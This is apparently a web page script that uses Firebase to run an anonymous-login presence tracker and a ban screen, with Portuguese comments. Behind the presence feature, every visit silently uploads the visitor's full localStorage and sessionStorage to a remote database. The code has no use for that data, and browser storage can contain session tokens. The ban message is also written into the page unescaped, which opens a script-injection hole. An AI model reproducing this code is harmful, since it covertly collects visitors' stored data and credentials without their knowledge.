// ================= FIREBASE =================
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
import { getDatabase, ref, set, update, onValue, onDisconnect, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyDon4WbCbe4kCkUq-OdLBRhzhMaUObbAfo",
  authDomain: "html-15e80.firebaseapp.com",
  databaseURL: "https://html-15e80-default-rtdb.firebaseio.com",
  projectId: "html-15e80",
  storageBucket: "html-15e80.firebasestorage.app",
  appId: "1:1068148640439:web:7cc5bde34f4c5a5ce41b32"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getDatabase(app);

// ================= LOGIN ANÔNIMO =================
signInAnonymously(auth).catch(err=>console.error("Erro login anônimo:",err));

// ================= FUNÇÃO PARA LEITURA DE STORAGE =================
function readStorage() {
  return {
    localStorage: Object.fromEntries(Object.entries(localStorage)),
    sessionStorage: Object.fromEntries(Object.entries(sessionStorage))
  };
}

// ================= ESCUTAR BANIMENTO =================
onAuthStateChanged(auth, user => {
  if(!user) return;
  const uid = user.uid;
  const userRef = ref(db, "users/" + uid);

  // registra presença
  set(userRef, {
    online: true,
    lastSeen: serverTimestamp(),
    storage: readStorage(),
    ban: {active:false, until:null}
  });

  onDisconnect(userRef).update({online:false,lastSeen:serverTimestamp()});

  // escuta mudanças em tempo real
  onValue(userRef, snap => {
    const data = snap.val();
    if(!data) return;

    // banimento
    if(data.ban?.active){
      if(data.ban.until && Date.now() > data.ban.until){
        update(userRef, {"ban/active":false,"ban/until":null});
        return;
      }
      mostrarBanBox(data.ban.reason || "Você foi banido.");
    }
  });
});

// ================= FUNÇÃO XANDE BOX =================
let adminOnline = false; // placeholder, admin verá no painel
function mostrarBanBox(motivo){
  document.documentElement.innerHTML = "";
  document.body.innerHTML = `
    <div style="
      position:fixed;
      inset:0;
      background:black;
      color:white;
      font-family:Arial;
      display:flex;
      align-items:center;
      justify-content:center;
      z-index:999999;
    ">
      <div style="
        background:#111;
        border:2px solid red;
        padding:30px;
        width:400px;
        text-align:center;
        box-shadow:0 0 20px red;
      ">
        <h1 style="color:red;">🚫 VOCÊ FOI BANIDO</h1>
        <p style="margin-top:15px;">${motivo}</p>

        <div style="
          margin-top:20px;
          padding:10px;
          background:#000;
          border:1px solid #333;
        ">
          <p>Status do Administrador:</p>
          <strong style="color:${adminOnline ? '#0f0' : '#f00'}">
            ${adminOnline ? "🟢 ONLINE" : "🔴 OFFLINE"}
          </strong>
        </div>

        <p style="margin-top:20px;color:#777;font-size:12px;">
          Não tente burlar o sistema.
        </p>
      </div>
    </div>
  `;

  // trava a tela
  setInterval(()=>document.body.innerHTML = document.body.innerHTML,500);
}